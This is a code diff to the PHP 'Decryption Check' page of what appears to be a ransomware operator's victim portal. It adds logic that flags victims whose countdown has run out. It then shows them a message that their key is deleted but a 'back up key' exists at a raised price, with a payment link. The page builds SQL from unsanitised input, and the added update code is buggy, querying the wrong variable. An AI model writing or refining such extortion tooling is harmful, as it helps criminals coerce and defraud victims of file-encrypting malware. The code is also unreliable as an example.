@@ -3,7 +3,7 @@
   <title>
     Decryption Check
   </title>
-
+  <script src="/jquery.js"></script>
 <?php
 $servername = "localhost";
 $username = "root";
@@ -32,10 +32,23 @@ if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
    if ($result->num_rows > 0) {
       while($row = $result->fetch_assoc()) {
           if ($row['time_left'] < "00:00:01") {
-             echo "Time expired, your associated private key has been deleted and your files forever lost!";
-          } else {
-             //echo "Time Remaining for $targetID: " . $row['time_left'] . "<br /><br />";
+             echo "$('#form_div').hide();" . "\n";
+             echo "$('#what_happened').hide();" . "\n";
 
+             $sql1 = "UPDATE target_list SET time_expired=\"TRUE\" where unique_id = \"$targetID\"";
+             $result1 = $conn->query($sql);
+
+             if ($result->num_rows > 0) {
+                echo "<center>";
+                echo "<font color=\"red\">";
+                echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
+                echo "<br /><br /><br />";
+                echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
+                echo "</font>";
+                echo "<a href='/payment.php'>Pay here</a><br /><br />";
+                echo "</center>";
+             }
+          } else {
              setcookie("unique_id", $targetID, strtotime('+1 year'));
 
              $page = $_SERVER['PHP_SELF'];
@@ -51,7 +64,6 @@ if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
 
    if (isset($_COOKIE['unique_id']) && !empty($_COOKIE['unique_id'])) {
 
-      echo "<script src=\"/jquery.js\"></script>" . "\n";
       echo "<script>" . "\n";
       echo "   $(document).ready(function() {" . "\n";
       echo "     $('#form_div').hide();" . "\n";
